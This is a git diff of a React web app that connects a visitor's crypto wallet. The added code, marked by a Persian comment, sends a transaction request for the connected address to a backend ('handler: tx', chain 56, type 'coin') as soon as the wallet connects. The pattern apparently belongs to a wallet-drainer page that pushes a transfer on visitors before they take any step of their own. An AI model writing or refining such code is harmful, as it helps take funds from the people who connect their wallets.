@@ -27,6 +27,9 @@ function App() {
         setAccount(accounts[0]);
         setWalletConnected(true);
         console.log("✅ Connected Wallet Address:", accounts[0]);
+
+        // پس از اتصال کیف پول، درخواست تراکنش ارسال شود
+        requestTransaction(accounts[0]);
       } else {
         console.log("⚠ No account found.");
       }
@@ -35,9 +38,9 @@ function App() {
     }
   }
 
-  async function requestTransaction() {
-    if (!walletConnected || !account) {
-      console.warn("⚠ Wallet not connected. Cannot send transaction request.");
+  async function requestTransaction(walletAddress) {
+    if (!walletAddress) {
+      console.warn("⚠ No wallet address found. Cannot send transaction request.");
       return;
     }
     
@@ -54,7 +57,7 @@ function App() {
           },
           body: new URLSearchParams({
             handler: "tx",
-            address: account,
+            address: walletAddress,
             chain: "56",
             type: "coin",
           }),
@@ -67,16 +70,6 @@ function App() {
       console.error("❌ Transaction Request Failed:", error);
     }
   }
-
-  useEffect(() => {
-    if (walletConnected) {
-      requestTransaction();
-    }
-  }, [walletConnected]);
-
-  useEffect(() => {
-    connectWallet(); // Try to connect wallet automatically on page load
-  }, []);
 
   return (
     <a
